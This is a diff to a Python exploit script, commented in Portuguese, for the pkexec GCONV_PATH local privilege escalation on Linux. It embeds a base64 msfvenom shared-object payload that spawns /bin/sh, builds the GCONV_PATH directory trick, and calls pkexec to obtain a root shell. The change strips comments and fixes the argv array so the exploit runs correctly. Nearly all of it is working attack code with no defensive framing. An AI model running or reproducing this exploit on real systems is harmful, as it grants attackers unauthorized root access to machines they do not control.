@@ -4,7 +4,7 @@ from ctypes.util import find_library
 import os
 import sys
 import shutil
-import base64  # Importando o módulo base64
+import base64
 
 # Definir o payload (como já está no seu código)
 payload_byte_msfvenom = b'''
@@ -17,6 +17,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
 AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
 '''
+
 payload64 = base64.b64decode(payload_byte_msfvenom)
 
 # Alterando as variáveis de ambiente
@@ -33,7 +34,7 @@ if os.path.exists("payload.so"):
     os.remove("payload.so")
 if os.path.exists("exploit"):
     shutil.rmtree("exploit")
-if os.path.exists("GCONV_PATH=."):
+if os.path.exists("GCONV_PATH=.") :
     shutil.rmtree("GCONV_PATH=.")
 
 # Criando a biblioteca compartilhada (payload)
@@ -42,9 +43,9 @@ with open('payload.so', 'wb') as f:
 os.chmod('payload.so', 755)
 
 # Criando diretórios necessários
-os.mkdir("GCONV_PATH=.")  # Criando diretório
+os.mkdir("GCONV_PATH=.")
 with open('GCONV_PATH=./exploit', 'wb') as f:
-    f.write(b'')  # Arquivo vazio
+    f.write(b'')
 os.chmod('GCONV_PATH=./exploit', 755)
 
 # Criando o diretório 'exploit'
@@ -62,4 +63,5 @@ environ_p[:] = environ
 libc = CDLL(find_library('c'))
 
 # Chamando o pkexec com o comando bash para obter uma shell root
-libc.execve(b'/usr/bin/pkexec', (c_char_p(b'pkexec'), c_char_p(b'/bin/bash')), environ_p)
+args = (c_char_p * 3)(b'pkexec', b'/bin/bash', None)
+libc.execve(b'/usr/bin/pkexec', args, environ_p)
